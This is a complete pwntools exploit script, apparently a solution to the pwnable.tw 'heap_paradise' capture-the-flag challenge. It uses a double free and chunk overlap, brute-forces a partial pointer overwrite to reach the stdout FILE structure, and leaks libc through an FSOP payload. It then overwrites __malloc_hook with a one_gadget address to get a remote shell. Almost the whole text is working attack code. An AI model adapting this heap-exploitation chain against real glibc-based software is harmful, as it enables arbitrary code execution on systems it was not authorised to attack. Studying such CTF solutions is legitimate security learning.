#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./heap_paradise_patched')
libc = ELF('./libc_64.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

def add(sz, data):
    sla('You Choice:', '1')
    sla('Size :', str(sz))
    sa('Data :', data)

def delete(idx):
    sla('You Choice:', '2')
    sla('Index :', str(idx))

while True:
    local = 0
    if local:
        p = process([elf.path])
    else:
        p = remote('chall.pwnable.tw', 10308)

    # double free to chunk overlapping
    add(0x68, '\x00' * 0x18 + up64(0x71)) # 0
    add(0x68, '\x00' * 0x18 + up64(0x21) + '\x00' * 0x28 + up64(0x21)) # 1
    delete(0)
    delete(1)
    delete(0)
    add(0x68, '\x20') # 2
    add(0x68, 'A') # 3
    add(0x68, 'A') # 4
    add(0x68, 'A') # 5
    delete(0)
    add(0x68, '\x00' * 0x18 + up64(0xa1)) # 6 <-- modify chunk 5's size
    #gdb.attach(p)
    delete(5) # put into unsorted bin

    '''
    (gdb) x/12gx 0x7ffff7dd2620-0x43
    0x7ffff7dd25dd <_IO_2_1_stderr_+157>:   0xfff7dd1660000000      0x000000000000007f
    0x7ffff7dd25ed <_IO_2_1_stderr_+173>:   0x0000000000000000      0x0000000000000000
    0x7ffff7dd25fd <_IO_2_1_stderr_+189>:   0x0000000000000000      0x0000000000000000
    0x7ffff7dd260d <_IO_2_1_stderr_+205>:   0x0000000000000000      0xfff7dd06e0000000
    0x7ffff7dd261d <_IO_2_1_stderr_+221>:   0x00fbad288700007f      0xfff7dd26a3000000
    0x7ffff7dd262d <_IO_2_1_stdout_+13>:    0xfff7dd26a300007f      0xfff7dd26a300007f
    '''
    # bruteforce _IO_2_1_stdin_ address
    delete(0)
    delete(1)
    add(0x78, '\x00' * 0x48 + up64(0x71) + '\xa0') # 7 <-- make chunk 1 pointing to main_arena
    delete(7)
    add(0x68, '\x00' * 0x28 + up64(0x71) + '\xdd\x25') # 8 <-- bruteforce

    # FSOP to leak
    add(0x68, 'B') # 9
    try:
        payload = '\x00' * 0x33 + up64(0xfbad1800) + up64(0) * 3 + '\x00' # https://blog.csdn.net/weixin_43960998/article/details/114258867
        #gdb.attach(p)
        add(0x68, payload) # 10
        ru(up64(0xfbad1800))
        data = r(0x28)
        break
    except EOFError:
        p.close()
        continue

libc_base = uu64(data[-0x8:]) - 0x3c46a3
info('libc_base = ' + hex(libc_base))
#gdb.attach(p)
one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc_base + one_gadgets[2]
info('one_gadget = ' + hex(one_gadget))
malloc_hook = libc_base + libc.sym['__malloc_hook']
info('malloc_hook = ' + hex(malloc_hook))

# overwrite __malloc_hook to one_gadget
delete(1)
add(0x78, '\x00' * 0x48 + up64(0x71) + up64(malloc_hook - 0x23)) # 11
add(0x68, 'C') # 12
add(0x68, '\x00' * 0x13 + up64(one_gadget)) # 13

#gdb.attach(p)
# get shell
sla('You Choice:', '1')
sla('Size :', '10')

p.interactive()

